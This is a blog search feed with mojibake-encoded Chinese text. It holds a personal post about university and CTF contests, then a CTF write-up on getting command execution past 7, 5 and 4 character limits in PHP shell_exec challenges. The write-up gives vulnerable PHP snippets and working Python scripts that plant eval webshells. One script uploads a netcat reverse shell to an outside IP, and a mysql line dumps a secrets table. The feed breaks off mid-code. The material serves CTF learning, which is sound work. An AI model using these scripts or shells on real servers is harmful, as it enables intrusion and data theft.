<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>å†™äºå…«ä¹ä¹‹äº¤çš„å¤§ä¸‰ä¸Šå¼€å­¦</title>
      <link href="/2022/08/31/xie-yu-ba-jiu-zhi-jiao-de-da-san-shang-kai-xue/"/>
      <url>/2022/08/31/xie-yu-ba-jiu-zhi-jiao-de-da-san-shang-kai-xue/</url>
      
        <content type="html"><![CDATA[<h3 id="å†™åœ¨å‰é¢"><a href="#å†™åœ¨å‰é¢" class="headerlink" title="å†™åœ¨å‰é¢"></a>å†™åœ¨å‰é¢</h3><p>ç»ˆäºï¼Œåœ¨å…«æœˆçš„æœ€åä¸€å¤©ï¼Œæˆ‘èƒ½å¼€å§‹æç¬”è®°å½•è‡ªå·±çš„ä¸€äº›æ‰€è§æ‰€æ„Ÿã€‚çœ‹ç€è‡ªå·±å‘å¸ƒçš„ä¸Šä¸€ç¯‡æ–‡ç« è¿˜æ˜¯åœ¨5æœˆï¼Œä¸å¾—ä¸è¯´æˆ‘ç¡®å®å¤ªæ‡’å•¦ï¼Œä¸€ç›´æ²¡æœ‰å¿ƒæ€æ¥æ›´æ–°è‡ªå·±çš„æ–‡ç« ï¼Œä¸ç®¡æ˜¯æŠ€æœ¯ä¸Šçš„ï¼Œè¿˜æ˜¯åœ¨ç”Ÿæ´»ä¸Šçš„ã€‚ä¸€æ–¹é¢å‘¢ï¼Œæˆ‘ä»å‡ ä¸ªæœˆå‰å°±å¼€å§‹ä½¿ç”¨è¯­é›€æ¥è®°å½•æˆ‘æŠ€æœ¯ä¸Šé¢çš„å­¦ä¹ è®°å½•ï¼Œä¸éœ€è¦èŠ±å¿ƒæ€æ¥è®°å½•å­¦ä¹ è¿‡ç¨‹æ¥æ›´æ–°åˆ°åšå®¢ä¸Šï¼Œç¡®å®ä¸ºæˆ‘çœä¸‹æ¥å¤§é‡çš„æ—¶é—´ï¼Œä½†è¿™å¿…ç„¶æœ‰åˆ©æœ‰å¼Šï¼Œå¾—è‡ªå·±æƒè¡¡å¾—å¤±ã€‚å¦ä¸€æ–¹é¢ï¼Œä¸Šå­¦æœŸæœŸæœ«å¾—å…¨åŠ›<del>åº”ä»˜</del>è€ƒè¯•ï¼Œæš‘å‡å‘¢æ¯”èµ›åˆå¤ªå¤šå•¦ï¼Œæƒ³æŠŠæ¯åœºæ¯”èµ›çš„é¢˜ç›®å¤ç°ä¸€ééƒ½å¿™ä¸è¿‡æ¥ï¼Œç¡®å®ä¹Ÿæ²¡æ—¶é—´æ¥æŠ˜è…¾åšå®¢äº†ğŸ˜¥ã€‚ä½†ï¼Œæ‰€å¹¸ï¼Œ8æœˆçš„æœ€åä¸€å¤©ï¼Œä¹Ÿæ˜¯æˆ‘å¼€å­¦æ¥çš„ç¬¬ä¸‰å¤©ï¼Œå†™ä¸‹æˆ‘ä¸ŠåŠå¹´çš„æœ€åä¸€ç¯‡æ–‡ç« å§ï¼</p><h3 id="ç¢ç¢å¿µ"><a href="#ç¢ç¢å¿µ" class="headerlink" title="ç¢ç¢å¿µ"></a>ç¢ç¢å¿µ</h3><h4 id="æœŸæœ«"><a href="#æœŸæœ«" class="headerlink" title="æœŸæœ«"></a>æœŸæœ«</h4><p>å¯¹äºæœŸæœ«ï¼Œæˆ‘è§‰å¾—è¿™ç¡®å®æ˜¯æ¯ä¸ªå¤§å­¦ç”Ÿ<del>ä¸å¯é¿å…çš„æœ€å¤§éº»çƒ¦</del>ï¼Œå¯¹æˆ‘æ¥è¯´ç¡®å®æ˜¯è¿™æ ·çš„ï¼Œæ¯•ç«Ÿå¹³æ—¶ä¸å­¦ï¼Œå¾—é æœŸæœ«æ¥<del>åˆ›é€ å¥‡è¿¹</del>äº†ğŸ˜–ã€‚è€ƒå®Œï¼Œé™¤äº†OSå’Œè®¡ç½‘ä»¤äººæ„Ÿå¹ï¼Œå…¶ä»–è¿˜å¥½ï¼ˆå¥½åƒå°±æ²¡æœ‰å‡ é—¨è¯¾ğŸ¤£ï¼‰ï¼Œæˆç»©å‘¢ï¼Œå¼€å­¦æ‰çœ‹åˆ°äº†æ•°æ®ç»“æ„è¯¾è®¾çš„æˆç»©ï¼Œå±å®å‡ºä¹æ„æ–™ï¼Œ<del>ç»™è€å¸ˆæ‘†äº†ä¸€é“ï¼Œä¸è¿‡ä¸€å­¦åˆ†é—®é¢˜ä¸å¤§ã€‚</del>æ€»çš„æ¥è¯´ï¼Œå¤§äºŒä¸‹çš„è¯¾ç¨‹å¯¹äºæˆ‘ä»¬è®¡ç®—æœºçš„å­¦ç”Ÿæ¥è¯´ï¼Œç¡®å®æ˜¯éå¸¸é‡è¦çš„ï¼Œä½†æˆ‘ç°åœ¨ä¹Ÿè®°ä¸å¾—å¤šå°‘äº†ï¼Œ<del>æ¯•ç«Ÿå­¦äº†å°±å¿˜ï¼Œäººä¹‹å¸¸æƒ…ã€‚</del>ğŸ¤£</p><h4 id="æš‘å‡"><a href="#æš‘å‡" class="headerlink" title="æš‘å‡"></a>æš‘å‡</h4><p>æœ¬æ¥æ˜¯å‡†å¤‡ç­‰8æœˆåˆçš„å›½èµ›çš„ï¼Œç»“æœä¸­é€”æ€å‡ºä¸ªé¹åŸæ¯ï¼Œæ‰€ä»¥7.15å°±æ—©æ—©ææ¡¶è·‘è·¯äº†ã€‚é¹åŸæ¯åœ¨æ·±åœ³ï¼Œæ‰€ä»¥ç›´æ¥å¯ä»¥å°±è¿‘å›å®¶äº†ï¼ˆå¥½åƒä¹Ÿä¸æ˜¯å¾ˆè¿‘ğŸ˜“ï¼‰ã€‚ä¸¤æ—¥çš„é¹åŸæ¯ï¼Œç¡¬æ˜¯ç»™æˆ‘ä»¬æ‰“æˆäº†ä¸€æ—¥ï¼Œå”¯ä¸€çš„æ„Ÿå—å°±æ˜¯<strong>ä¼™é£ŸæŒºå¥½</strong>ï¼Œå‰©ä¸‹ä¸€æ—¥ç›´æ¥å»é€›äº†é€›é™„è¿‘çš„æ™¯åŒºç©äº†ç©ğŸ¤£ï¼ˆæ‘†çƒ‚æï¼‰ã€‚ç¬¬ä¸€æ—¥ï¼Œé—¨å¤–ç­¾åˆ°å®Œï¼Œç›´æ¥ä¸Šæ¥¼é…ç½‘å¼€å§‹æ¯”èµ›ï¼Œæ¯”èµ›çš„é¢˜ç›®å‡ ä¹éƒ½æ˜¯æ¸—é€æµ‹è¯•å§ï¼Œä½†æ˜¯ä¸ç»™ä¸Šç½‘å°±ç»™é™åˆ¶ä½äº†%80çš„åšé¢˜èƒ½åŠ›ï¼Œï¼Œå¥ˆä½•é˜Ÿå†…çš„webğŸ¶ï¼ˆå°±æ˜¯æˆ‘ï¼‰çŸ¥è¯†å‚¨å¤‡ä¸å¤ªè¡Œï¼Œæ‰€ä»¥æ ¹æœ¬æ‰“ä¸åŠ¨ï¼Œç›´æ¥å››äººåå¤§ç‰¢ã€‚ä»¤äººæ¬£æ…°çš„æ˜¯èŒ¶æ­‡åŒºçš„é›¶é£Ÿå……è¶³ï¼Œä¸­åˆå’Œä¸‹åˆçš„è‡ªä¸»ä¼™é£Ÿä¸é”™ï¼ˆæœ‰ç‚¹ç¾¡æ…•é¹åŸå®éªŒå®¤çš„äººäº†ï¼‰ã€‚å°±è¿™æ ·ï¼Œåç‰¢ä¸€å¤©ï¼Œæœ€åæ‹¿äº†800å·¦å³çš„åˆ†æ•°ï¼Œçœ‹æ’è¡Œæ¦œæ‰çŸ¥é“ç«Ÿç„¶ä¸æ˜¯å«åº•çš„ã€‚å’Œæ¦œä¸€çš„å¤§å“¥å·®äº†å¥½åƒä¸¤åƒåˆ†ğŸ˜¥ï¼ˆï¼Ÿå‰é¢çš„å¤§å“¥ä¸Šåˆ†ç¡®å®ææ€–ï¼Œæ¯”ä¸äº†æ¯”ä¸äº†ï¼Œä¸‹æ¬¡ä¸€å®šã€‚æ™šä¸Šæ”¶æ‹¾å›å»çš„æ—¶å€™ï¼Œå·¥ä½œäººå‘˜å‘Šè¯‰æˆ‘ä»¬ç°åœ¨é¢†å¼ å¥–çŠ¶å›å»ï¼Œæ˜å¤©å°±å¯ä»¥ä¸æ¥äº†ğŸ¤£ï¼Œäºæ˜¯æˆ‘ä»¬å°±å›å»äº†å“ˆå“ˆå“ˆï¼ˆÃ—ï¼‰ç¬¬äºŒå¤©å°±åˆ°é™„è¿‘é€›äº†é€›ï¼Œæ„Ÿå—æ˜¯å¤§çƒ­å¤©ç¡®å®ä¸é€‚åˆå‡ºå»æ¸¸ç©ã€‚</p><p>æœ¬ä»¥ä¸ºå¯ä»¥å»å¤©æ´¥æ¸¸ç©ä¸€ç•ªï¼Œä½†æ˜¯å›½èµ›é€šçŸ¥ç›´æ¥çº¿ä¸Šå•¦ï¼ŒçŒä¸åŠé˜²ï¼Œè¿™åº”è¯¥æ˜¯ç¬¬ä¸€å±Šçº¿ä¸Šçš„å›½èµ›äº†ï¼ŒçœŸæ˜¯å¹¸è¿å„¿ï¼Œ<del>æˆ‘è¿˜ä½“éªŒè¿‡ç¬¬ä¸€æ¬¡é«˜è€ƒå»¶æœŸ</del>ğŸ˜¥ã€‚åæ¥ï¼Œç«Ÿç„¶å¤©æ´¥å»ä¸æˆï¼Œé‚£å°±å»ä¸Šæµ·è·Ÿç€å¤§å“¥ä»¬æ‰“defconæŠŠï¼Œè¿™ä¸€æ¬¡ä¹Ÿç¡®å®ä¸€æ¬¡æ–°å¥‡çš„ç»å†ï¼defconæ˜¯ä¸€ä¸ªå›½é™…èµ›ï¼Œæˆ‘ä»¬æ˜¯ä½œä¸ºKatzebinçš„è”åˆæˆ˜é˜Ÿæˆå‘˜å—é‚€è¿‡å»å‚èµ›çš„ï¼Œè¿™ä¸€åœºå›½é™…èµ›å¯¹äºæˆ‘è¿™ç§webğŸ¶æ¥è¯´ä¸æ˜¯å¾ˆå‹å¥½ï¼Œå› ä¸ºå‡ ä¹éƒ½æ˜¯äºŒè¿›åˆ¶çš„é¢˜ç›®ã€‚ä¸è¿‡è¿™æ¬¡æ‹‰å‡ºæ¥äº†ä¸€é“javaé¢˜ï¼Œè¿˜æ˜¯æœ‰ä¸€ç‚¹ä½“éªŒæ„Ÿçš„</p>]]></content>
      
      
      <categories>
          
          <category> é—²è¨€ç¢è¯­ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å°è®° </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä¸åŒé•¿åº¦å­—ç¬¦çš„å‘½ä»¤æ‰§è¡Œ</title>
      <link href="/2022/05/16/bu-tong-chang-du-zi-fu-de-ming-ling-zhi-xing/"/>
      <url>/2022/05/16/bu-tong-chang-du-zi-fu-de-ming-ling-zhi-xing/</url>
      
        <content type="html"><![CDATA[<h3 id="ä¸åŒé•¿åº¦å­—ç¬¦çš„å‘½ä»¤æ‰§è¡Œ"><a href="#ä¸åŒé•¿åº¦å­—ç¬¦çš„å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="ä¸åŒé•¿åº¦å­—ç¬¦çš„å‘½ä»¤æ‰§è¡Œ"></a>ä¸åŒé•¿åº¦å­—ç¬¦çš„å‘½ä»¤æ‰§è¡Œ</h3><p>è€ƒè™‘7å­—ç¬¦ã€5å­—ç¬¦ã€4å­—ç¬¦é•¿åº¦é™åˆ¶å¦‚ä½•å®ç°å‘½ä»¤æ‰§è¡Œï¼Œç¯å¢ƒåŸºäºlinux alpineã€‚  </p><h4 id="ls-tçªç ´7å­—ç¬¦é™åˆ¶ï¼ˆwebç›®å½•å¯å†™ï¼‰"><a href="#ls-tçªç ´7å­—ç¬¦é™åˆ¶ï¼ˆwebç›®å½•å¯å†™ï¼‰" class="headerlink" title="ls-tçªç ´7å­—ç¬¦é™åˆ¶ï¼ˆwebç›®å½•å¯å†™ï¼‰"></a>ls-tçªç ´7å­—ç¬¦é™åˆ¶ï¼ˆwebç›®å½•å¯å†™ï¼‰</h4><h5 id="æ¼æ´ä»£ç "><a href="#æ¼æ´ä»£ç " class="headerlink" title="æ¼æ´ä»£ç "></a>æ¼æ´ä»£ç </h5><pre class="line-numbers language-none"><code class="language-none">&lt;?phperror_reporting(0);highlight_file(__FILE__);$cmd &#x3D; $_POST[&#39;cmd&#39;];if(strlen($cmd) &lt;&#x3D; 7)&#123;    shell_exec($cmd);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="7å­—ç¬¦getshellè„šæœ¬"><a href="#7å­—ç¬¦getshellè„šæœ¬" class="headerlink" title="7å­—ç¬¦getshellè„šæœ¬"></a>7å­—ç¬¦getshellè„šæœ¬</h5><pre class="line-numbers language-none"><code class="language-none">éœ€è¦å†™å…¥çš„è¯­å¥ï¼š&lt;?php eval($_GET[1]);ç¼–ç åçš„è¯­å¥ï¼šPD9waHAgZXZhbCgkX0dFVFsxXSk7éœ€è¦æ‰§è¡Œçš„è¯­å¥ï¼šecho PD9waHAgZXZhbCgkX0dFVFsxXSk7|base64 -d&gt;1.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">import requestsimport timeurl &#x3D; &quot;http:&#x2F;&#x2F;ed9441a5-6e27-43b0-8538-bdd2f5a5b4d2.challenge.ctf.show&#x2F;&quot;payload&#x3D;[&quot;&gt;hp&quot;,&quot;&gt;1.p\\&quot;,&quot;&gt;d\\&gt;\\&quot;,&quot;&gt;\\ -\\&quot;,&quot;&gt;e64\\&quot;,&quot;&gt;bas\\&quot;,&quot;&gt;7\\|\\&quot;,&quot;&gt;XSk\\&quot;,&quot;&gt;Fsx\\&quot;,&quot;&gt;dFV\\&quot;,&quot;&gt;kX0\\&quot;,&quot;&gt;bCg\\&quot;,&quot;&gt;XZh\\&quot;,&quot;&gt;AgZ\\&quot;,&quot;&gt;waH\\&quot;,&quot;&gt;PD9\\&quot;,&quot;&gt;o\\ \\&quot;,&quot;&gt;ech\\&quot;,&quot;ls -t&gt;0&quot;,&quot;. 0&quot;]def writeFile(payload):data&#x3D;&#123;&quot;cmd&quot;:payload&#125;requests.post(url,data&#x3D;data)def run():for p in payload:writeFile(p.strip())print(&quot;[*] create &quot;+p.strip())time.sleep(1)def check():response &#x3D; requests.get(url+&quot;1.php&quot;)if response.status_code &#x3D;&#x3D; requests.codes.ok:print(&quot;[*] Attack success!!!Webshell is &quot;+url+&quot;1.php&quot;)def main():run()check()if __name__ &#x3D;&#x3D; &#39;__main__&#39;:main()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="webç›®å½•ä¸å¯å†™çš„æƒ…å†µ"><a href="#webç›®å½•ä¸å¯å†™çš„æƒ…å†µ" class="headerlink" title="webç›®å½•ä¸å¯å†™çš„æƒ…å†µ"></a>webç›®å½•ä¸å¯å†™çš„æƒ…å†µ</h4><p><strong>æ¼æ´ä»£ç åŒä¸Š</strong>ï¼Œæ˜¯ä¸€æ ·çš„ï¼Œå°±æ˜¯ç°åœ¨çš„webç›®å½•ä¸‹æ²¡æœ‰å†™æ–‡ä»¶çš„æƒé™äº†ã€‚  </p><p>åˆ©ç”¨æ–¹å¼ï¼šç›´æ¥å¼ºåˆ¶<strong>ä¸Šä¼ åå¼¹shellæ–‡ä»¶</strong>åˆ°ä¸´æ—¶ç›®å½•ï¼Œç„¶åç›´æ¥ä¸ƒå­—ç¬¦æ‰§è¡Œï¼ï¼ŒåŸç†å¦‚å›¾ï¼š</p><p><img src="/images/short/upload.png" class="lazyload placeholder" data-srcset="/images/short/upload.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"></p><h5 id="å¼ºåˆ¶ä¸Šä¼ getshellè„šæœ¬"><a href="#å¼ºåˆ¶ä¸Šä¼ getshellè„šæœ¬" class="headerlink" title="å¼ºåˆ¶ä¸Šä¼ getshellè„šæœ¬"></a>å¼ºåˆ¶ä¸Šä¼ getshellè„šæœ¬</h5><p>é‡ç‚¹æ˜¯é‡Œé¢çš„ï¼š<code>. /t*/*</code>,è¿™é‡Œä¸ƒå­—ç¬¦ç›´æ¥æ‰§è¡Œäº†&#x2F;tmpç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶ï¼</p><pre class="line-numbers language-none"><code class="language-none">import requestsimport timeurl &#x3D; &quot;http:&#x2F;&#x2F;f1f8f51f-8da6-43cc-ab09-d5456cc2bcb7.challenge.ctf.show&#x2F;&quot;def getShell(payload):data&#x3D;&#123;&quot;cmd&quot;:payload&#125;file &#x3D; &#123;&quot;file&quot;:b&quot;#!&#x2F;bin&#x2F;sh\nnc 43.154.107.226 3389 -e &#x2F;bin&#x2F;sh&quot;&#125;requests.post(url,data&#x3D;data,files&#x3D;file)    print(&quot;[*] Attack success!!!&quot;)def run():getShell(&quot;. &#x2F;t*&#x2F;*&quot;)def main():run()if __name__ &#x3D;&#x3D; &#39;__main__&#39;:main()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>getshellä¹‹åæœ‰ä¸ªé‡è¦çš„ç‚¹å°±æ˜¯flagæ˜¯åœ¨æ•°æ®åº“é‡Œé¢çš„ï¼Œç„¶è€Œåå¼¹shellä¹‹åå‘¢ï¼Œä½¿ç”¨äº¤äº’å¼mysqlç»å¸¸ä¼šæ–­å¼€è¿æ¥ã€‚ã€‚ã€‚æ‰€ä»¥åªèƒ½ä½¿ç”¨éäº¤äº’å¼çš„mysqlè¿›è¡Œè¯­å¥çš„æŸ¥è¯¢ï¼Œå¦‚ä¸‹ï¼š  </p><p><code>mysql -uroot -proot -e&quot;use ctfshow;select * from ctfshow_secret;&quot;</code>  </p><h4 id="dirçªç ´5å­—ç¬¦é•¿åº¦çš„å‘½ä»¤æ‰§è¡Œ"><a href="#dirçªç ´5å­—ç¬¦é•¿åº¦çš„å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="dirçªç ´5å­—ç¬¦é•¿åº¦çš„å‘½ä»¤æ‰§è¡Œ"></a>dirçªç ´5å­—ç¬¦é•¿åº¦çš„å‘½ä»¤æ‰§è¡Œ</h4><h5 id="æ¼æ´ä»£ç -1"><a href="#æ¼æ´ä»£ç -1" class="headerlink" title="æ¼æ´ä»£ç "></a>æ¼æ´ä»£ç </h5><pre class="line-numbers language-none"><code class="language-none">&lt;?phperror_reporting(0);highlight_file(__FILE__);$cmd &#x3D; $_POST[&#39;cmd&#39;];if(strlen($cmd) &lt;&#x3D; 5)&#123;    shell_exec($cmd);&#125;?&gt;æ¡ä»¶æ˜¯åªæœ‰äº”å­—ç¬¦å‘½ä»¤å¯ä»¥æ‰§è¡Œï¼Œå½“å‰webç›®å½•å¯å†™<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ–¹æ³•æ€è·¯ï¼š  </p><p>1ã€å°†index.phpå˜æˆ.phpï¼ˆæŒºå¤æ‚çš„ã€‚å°±æ˜¯å…³äº<code>dir</code>å‘½ä»¤çš„å¦™ç”¨ï¼Œ<code>dir</code>å‘½ä»¤å’Œ<code>ls</code>å‘½ä»¤ä¸»è¦çš„åŒºåˆ«å°±æ˜¯<code>dir</code>å†™åˆ°æ–‡ä»¶æ—¶ä¸ä¼šæ¢è¡Œï¼Œä½†æ˜¯<code>ls</code>  å‘½ä»¤å†™åˆ°æ–‡ä»¶æ—¶ä¼šæ¢è¡Œï¼è¿™é‡Œçš„ç›®çš„åº”è¯¥ä¸»è¦æ˜¯é˜²æ­¢å¦¨ç¢åé¢çš„ä¸´æ—¶æ–‡ä»¶æ‰“åŒ…åˆ°å½“å‰ç›®å½•æŠŠ</p><p>2ã€å°†ä¸´æ—¶æ–‡ä»¶æ‰“åŒ…åˆ°å½“å‰ç›®å½•ï¼Œ<code>* /t*</code>ï¼Œè¿™æ˜¯äº”å­—ç¬¦å†™å…¥æ–¹å¼ï¼ï¼ˆéœ€è¦å…ˆåœ¨&#x2F;tmpç›®å½•ä¸‹å†™ä¸€ä¸ªä¸€å¥è¯  ï¼Œåº”è¯¥æ˜¯å¼ºåˆ¶ä¸Šä¼ å§ï¼Œ<code>&lt;?php file_put_contents(&quot;1.php&quot;,&quot;&lt;?php eval($_POST[1]);?&gt;&quot;);?&gt;</code>ï¼Œè¿™æ˜¯æ–‡ä»¶çš„å†…å®¹</p><p>3ã€ä½¿ç”¨phpæ‰§è¡Œtarå‹ç¼©åŒ…  ï¼Œè™½ç„¶æ‰“åŒ…çš„æ–‡ä»¶å¯èƒ½æœ‰å¾ˆå¤šå…¶ä»–çš„å­—ç¬¦ï¼Œä½†æ˜¯phpç›¸å…³çš„å†…å®¹è¿˜æ˜¯åœ¨é‡Œé¢æ²¡æœ‰å˜åŠ¨ï¼Œå› æ­¤å¯ä»¥ç›´æ¥æ‰§è¡Œphpä»£ç ï¼Œä¾‹å¦‚ç›´æ¥<code>php z</code>ï¼Œè¿™æ˜¯äº”ä¸ªå­—ç¬¦ï¼Œä¼šå°†ä¸Šè¿°å†™å…¥ä¸€å¥è¯çš„ä»£ç æ‰§è¡Œã€‚</p><h5 id="æ‰§è¡Œè„šæœ¬"><a href="#æ‰§è¡Œè„šæœ¬" class="headerlink" title="æ‰§è¡Œè„šæœ¬"></a>æ‰§è¡Œè„šæœ¬</h5><pre class="line-numbers language-none"><code class="language-none">import requestsimport timeurl &#x3D; &quot;http:&#x2F;&#x2F;00d5415e-1e8d-42f6-9fe0-81052fa99f6a.challenge.ctf.show&#x2F;&quot;url_2 &#x3D; url + &quot;.php&quot;delay &#x3D; 1chagneFile_payload &#x3D; [    &#39;&gt;cp&#39;,    &#39;&gt;k&#39;,    &#39;*&#39;,    &#39;rm cp&#39;,    &#39;&gt;pc&#39;,    &#39;&gt;dir&#39;,    &#39;*&gt;v&#39;,    &#39;&gt;rev&#39;,    &#39;*v&gt;z&#39;,    &#39;sh z&#39;,    &#39;rm v&#39;,    &#39;rm k&#39;,    &#39;rm z&#39;,    &#39;rm pc&#39;,    &#39;rm *v&#39;,    &#39;&gt;php.&#39;,    &#39;&gt;j\\#&#39;,    &#39;&gt;vm&#39;,    &#39;*&gt;v&#39;,    &#39;&gt;rev&#39;,    &#39;*v&gt;z&#39;,    &#39;sh z&#39;]clearFile_payload &#x3D; [    &#39;rm d*&#39;,    &#39;rm j*&#39;,    &#39;rm p*&#39;,    &#39;rm r*&#39;,    &#39;rm v*&#39;,    &#39;rm z&#39;]shell_payload &#x3D; [    &#39;&gt;tar&#39;,    &#39;&gt;vcf&#39;,    &#39;&gt;z&#39;]file &#x3D; &#123;    &#39;file&#39;: b&#39;&lt;?php file_put_contents(&quot;1.php&quot;,&quot;&lt;?php eval(\\$_POST[1]);?&gt;&quot;);?&gt;&#39;&#125;def changeFile():    for p in chagneFile_payload:        sendPayload(url, p)        print(&quot;[*] create &quot; + p.strip())        time.sleep(delay)def clearFile():    for p in clearFile_payload:        sendPayload(url_2, p)        print(&quot;[*] create &quot; + p.strip())        time.sleep(delay)def getshell():    for p in shell_payload:        sendPayload(url_2, p)        print(&quot;[*] create &quot; + p.strip())        time.sleep(delay)    data &#x3D; &#123;        &quot;cmd&quot;: &quot;* &#x2F;t*&quot;    &#125;    requests.post(url_2, data&#x3D;data, files&#x3D;file)    data &#x3D; &#123;        &quot;cmd&quot;: &quot;php z&quot;    &#125;    requests.post(url_2, data&#x3D;data)def checkShell():    response &#x3D; requests.get(url + &quot;1.php&quot;)    if response.status_code &#x3D;&#x3D; requests.codes.ok:        print(&quot;[*] Attack success!!!Webshell is &quot; + url + &quot;1.php&quot;)def sendPayload(url, payload):    data &#x3D; &#123;        &quot;cmd&quot;: payload    &#125;    requests.post(url, data&#x3D;data)def run():    changeFile()    clearFile()    getshell()    checkShell()def main():    run()if __name__ &#x3D;&#x3D; &#39;__main__&#39;:    main()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="grepçªç ´dirè¢«é™åˆ¶çš„5å­—ç¬¦å‘½ä»¤æ‰§è¡Œ"><a href="#grepçªç ´dirè¢«é™åˆ¶çš„5å­—ç¬¦å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="grepçªç ´dirè¢«é™åˆ¶çš„5å­—ç¬¦å‘½ä»¤æ‰§è¡Œ"></a>grepçªç ´dirè¢«é™åˆ¶çš„5å­—ç¬¦å‘½ä»¤æ‰§è¡Œ</h4><p><strong>æ¼æ´ä»£ç å’Œä¸Šé¢çš„ä¸€æ ·</strong>ï¼Œä¸è¿‡è¿™ä¸€æ¬¡åŠ äº†dirä¸å¯æ‰§è¡Œçš„é™åˆ¶ï¼  </p><p>ä¸»è¦çš„æ€è·¯å°±æ˜¯ä½¿ç”¨<code>grep h index.php</code>ï¼Œå°†<code>shell_exec</code>æ‹·è´å‡ºæ¥ï¼Œç„¶ååœ¨å¤åˆ¶å›<code>index.php</code>ä¸­ï¼Œå°±å¯ä»¥ç»•è¿‡5ä¸ªå­—ç¬¦çš„é™åˆ¶äº†ï¼  </p><h5 id="è„šæœ¬åˆ©ç”¨"><a href="#è„šæœ¬åˆ©ç”¨" class="headerlink" title="è„šæœ¬åˆ©ç”¨"></a>è„šæœ¬åˆ©ç”¨</h5><pre class="line-numbers language-none"><code class="language-none">import requestsimport timeurl &#x3D; &quot;http:&#x2F;&#x2F;0da3e190-b112-4e8f-84ac-4191ce1cad6d.challenge.ctf.show&#x2F;&quot;payload &#x3D; [    &quot;&gt;grep&quot;,    &quot;&gt;h&quot;,    &quot;*&gt;j&quot;,    &quot;rm g*&quot;,    &quot;rm h*&quot;,    &quot;&gt;cat&quot;,    &quot;*&gt;&gt;i&quot;,    &quot;rm c*&quot;,    &quot;rm j&quot;,    &quot;&gt;cp&quot;,    &quot;*&quot;]def writeFile(payload):    data &#x3D; &#123;        &quot;cmd&quot;: payload    &#125;    requests.post(url, data&#x3D;data)def run():    for p in payload:        writeFile(p.strip())        print(&quot;[*] create &quot; + p.strip())        time.sleep(0.3)    print(&quot;[*] Attack success!!!Webshell is &quot; + url)def main():    run()if __name__ &#x3D;&#x3D; &#39;__main__&#39;:    main()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è™½ç„¶æ‰§è¡Œå<code>index.php</code>ç»™æ”¹äº†ï¼Œä½†æ˜¯å‘½ä»¤æ‰§è¡Œåæ²¡å›æ˜¾ï¼Œä¸çŸ¥é“æ˜¯å“ªé‡Œçš„é—®é¢˜ã€‚ã€‚</p><h4 id="webç›®å½•å¯å†™ä¸”æœ‰dirçš„4å­—ç¬¦çš„å‘½ä»¤æ‰§è¡Œ"><a href="#webç›®å½•å¯å†™ä¸”æœ‰dirçš„4å­—ç¬¦çš„å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="webç›®å½•å¯å†™ä¸”æœ‰dirçš„4å­—ç¬¦çš„å‘½ä»¤æ‰§è¡Œ"></a>webç›®å½•å¯å†™ä¸”æœ‰dirçš„4å­—ç¬¦çš„å‘½ä»¤æ‰§è¡Œ</h4><h5 id="æ¼æ´ä»£ç -2"><a href="#æ¼æ´ä»£ç -2" class="headerlink" title="æ¼æ´ä»£ç "></a>æ¼æ´ä»£ç </h5><pre class="line-numbers language-none"><code class="language-none">&lt;?phperror_reporting(0);highlight_file(__FILE__);$cmd &#x3D; $_POST[&#39;cmd&#39;];if(strlen($cmd) &lt;&#x3D; 4)&#123;    shell_exec($cmd);&#125;?&gt;<span aria-hidden="true" 